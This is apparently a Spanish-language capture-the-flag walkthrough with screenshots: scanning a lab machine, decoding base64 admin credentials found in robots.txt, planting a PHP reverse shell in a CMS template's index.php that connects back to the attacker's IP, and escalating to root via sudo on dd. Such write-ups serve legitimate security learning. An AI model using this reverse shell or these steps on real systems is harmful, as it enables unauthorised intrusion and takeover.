1- ping y NMAP

<img width="768" height="475" alt="image" src="https://github.com/user-attachments/assets/82dd84c0-5bad-4a5b-b4ee-2008b975fb03" />

2- gobuster para ver directorios

<img width="941" height="711" alt="image" src="https://github.com/user-attachments/assets/1e5da211-c9c5-4b9b-a69c-209644cdf032" />

3- Vemos que hay un directorio que se llama robots.txt vamos a entrar y encontramos esto : admin:c2FubHVpczEyMzQ1
ahora lo desciframos :::: echo "c2FubHVpczEyMzQ1" | base64 -d

4- Y tenemos la password y el usuario para entrar

<img width="1548" height="634" alt="image" src="https://github.com/user-attachments/assets/3cccf261-62d9-4428-a3ec-3ca8ed955ea9" />

Nos dirigimos aqui e introducimos una reverse shell dentro del codigo php de index.php

$sock = fsockopen("TUIP",1234);
$proc = proc_open('/bin/sh', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
defined('_JEXEC') or die;

Nos ponemos en escucha en nuestra terminal y ejecutamos la ruta http del index.php

<img width="233" height="48" alt="image" src="https://github.com/user-attachments/assets/5a1be667-2f20-4450-bd43-8e68361a6b45" />

Tratamos la consola ::

<img width="560" height="169" alt="image" src="https://github.com/user-attachments/assets/b3694e8b-decf-46bc-8fea-84dff6ae5d54" />

Busco algun fichero .txt o algo para seguir progresando:

<img width="507" height="40" alt="image" src="https://github.com/user-attachments/assets/32ea1a6a-99a7-4068-b6a8-d656b68a8f10" />

Dentro de este fichreo encontraremos un usuario y otra password. Vamos a usarlas.

5- Escalar a root

<img width="295" height="44" alt="image" src="https://github.com/user-attachments/assets/51c51a74-371e-420a-afca-c7e19085a769" />

Vemos que es vulnerable sudo -l , a dd y buscamos GTFOBins.

<img width="737" height="119" alt="image" src="https://github.com/user-attachments/assets/b12bc4d2-ff26-4cc3-918c-ddd3d79df3ed" />

